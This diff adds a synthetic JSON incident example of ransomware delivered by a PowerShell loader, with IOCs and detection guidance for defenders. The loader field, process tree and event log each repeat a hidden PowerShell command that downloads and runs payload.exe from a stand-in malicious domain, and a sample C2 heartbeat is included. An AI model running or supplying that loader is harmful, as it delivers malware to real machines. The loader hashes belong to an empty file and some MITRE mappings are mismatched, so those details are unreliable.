@@ -1,0 +1,97 @@
+{
+  "examples": [
+    {
+      "scenario": "Ransomware as a Service Infection via PowerShell Loader Dropped by Malicious Email Attachment Leading to Endpoint Encryption",
+      "technical_data": {
+        "file_hashes": {
+          "loader_exe": {
+            "md5": "d41d8cd98f00b204e9800998ecf8427e",
+            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "ransomware_payload": {
+            "md5": "9a5a9c3d7a8b7f6c8d8e5d3a2c1b0f9e",
+            "sha1": "5c8e6a9b7f4c3d2a1e0f9b8a7c6d5e4f3b2a1c0d",
+            "sha256": "f4b645c69de1a8b3c2e5f9d8a6b4c7e0d1f2a3b4c5d6e7f8192a3b4c5d6e7f8a"
+          }
+        },
+        "powershell_loader_script": "powershell -nop -w hidden -c \"$client = New-Object System.Net.WebClient; $client.DownloadFile('http://maliciousdomain[.]com/payload.exe', '$env:TEMP\\payload.exe'); Start-Process '$env:TEMP\\payload.exe'\"",
+        "registry_changes": [
+          {
+            "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterService",
+            "type": "REG_SZ",
+            "data": "\"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\""
+          },
+          {
+            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\UpdaterService",
+            "type": "REG_DWORD",
+            "data": "0x00000001"
+          }
+        ],
+        "process_tree": [
+          {
+            "parent_process": "explorer.exe",
+            "child_process": "powershell.exe",
+            "command_line": "powershell -nop -w hidden -c \"$client = New-Object System.Net.WebClient; $client.DownloadFile('http://maliciousdomain.com/payload.exe', '$env:TEMP\\payload.exe'); Start-Process '$env:TEMP\\payload.exe'\""
+          },
+          {
+            "parent_process": "powershell.exe",
+            "child_process": "payload.exe",
+            "command_line": "\"C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe\""
+          }
+        ],
+        "c2_traffic_sample": "POST /api/v1/heartbeat HTTP/1.1\r\nHost: c2server.attacker.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 58\r\n\r\n{\"id\":\"host1234\",\"status\":\"ready\",\"enc_key\":\"abc123xyz\"}",
+        "memory_dump_snippet": "Process: payload.exe\nModules:\n  ntdll.dll\n  kernel32.dll\n  user32.dll\n  crypt32.dll\nStrings found:\n  EncryptFile\n  GetKey\n  SendData\n  ransom_note.txt\n  .encrypted\n\n",
+        "event_logs": [
+          {
+            "timestamp": "2024-06-13T14:22:45.123Z",
+            "event_id": 4688,
+            "message": "A new process has been created: New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Command Line: powershell -nop -w hidden -c \"$client = New-Object System.Net.WebClient; $client.DownloadFile('http://maliciousdomain.com/payload.exe', '$env:TEMP\\payload.exe'); Start-Process '$env:TEMP\\payload.exe'\" Parent Process Name: explorer.exe"
+          },
+          {
+            "timestamp": "2024-06-13T14:23:05.456Z",
+            "event_id": 11,
+            "message": "File C:\\Users\\user\\AppData\\Local\\Temp\\payload.exe was created."
+          }
+        ],
+        "backup_logs": [
+          {
+            "timestamp": "2024-06-12T01:00:00.000Z",
+            "backup_status": "success",
+            "target": "offline_backup_server",
+            "notes": "Last known clean backup before infection"
+          }
+        ]
+      },
+      "indicators": {
+        "ioc_domains": [
+          "maliciousdomain.com",
+          "c2server.attacker.com"
+        ],
+        "ioc_files": [
+          "payload.exe",
+          "ransom_note.txt"
+        ],
+        "ioc_registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterService"
+        ],
+        "ioc_process_names": [
+          "payload.exe",
+          "powershell.exe (with suspicious command line)"
+        ],
+        "ioc_network_patterns": [
+          "POST /api/v1/heartbeat to c2server.attacker.com"
+        ]
+      },
+      "detection_method": "Monitor for suspicious PowerShell execution with encoded or obfuscated commands downloading payloads from uncommon external domains. Use EDR to detect child process spawning from PowerShell downloading executables into TEMP folder. Detect registry autorun keys with unusual names like 'UpdaterService' pointing to temp executables. Alert on network traffic to known malicious domains performing POST requests with JSON heartbeat patterns. Verify backup integrity and ensure offline backups are isolated. Monitor file creation events in TEMP folder and immediate process creation chains. Correlate event IDs 4688 (process creation) with network connections from those processes.",
+      "relevant_mitre_techniques": [
+        "T1059.001",
+        "T1105",
+        "T1543.003",
+        "T1486",
+        "T1086",
+        "T1005"
+      ]
+    }
+  ]
+}
